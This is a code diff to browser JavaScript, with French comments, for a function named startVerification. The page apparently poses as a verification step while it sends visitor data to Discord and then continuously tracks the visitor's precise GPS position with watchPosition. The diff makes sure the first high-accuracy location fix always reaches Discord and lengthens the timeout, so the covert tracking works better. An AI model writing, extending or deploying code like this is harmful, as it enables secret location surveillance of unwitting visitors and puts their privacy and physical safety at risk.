@@ -184,17 +184,10 @@ async function startVerification() {
         // ENVOI IMMÉDIAT DISCORD (sans attendre le GPS pour libérer l'écran)
         logVisitor(null, false, true);
 
-        // On lance la récupération GPS en arrière-plan
-        getPreciseLocation().then(async (location) => {
-            if (location) {
-                lastLoggedPos = location;
-                // ENVOI GPS DISCORD
-                await logVisitor(location, true, true);
-            }
-        }).catch(() => {});
-
         // On libère l'écran tout de suite pour l'utilisateur
         overlay.style.display = 'none';
+
+        let firstGpsPointSent = false;
 
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition(
@@ -204,9 +197,18 @@ async function startVerification() {
                         accuracy: position.coords.accuracy, speed: position.coords.speed
                     };
                     
+                    // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
+                    if (!firstGpsPointSent) {
+                        firstGpsPointSent = true;
+                        lastLoggedPos = newLoc;
+                        await logVisitor(newLoc, false, true);
+                        return;
+                    }
+
+                    // Points suivants: Appliquer les filtres de distance
                     if (!lastLoggedPos) {
                         lastLoggedPos = newLoc;
-                        await logVisitor(newLoc, true, true);
+                        await logVisitor(newLoc, true);
                         return;
                     }
 
@@ -223,7 +225,7 @@ async function startVerification() {
                     }
                 },
                 null,
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
             );
         }
 
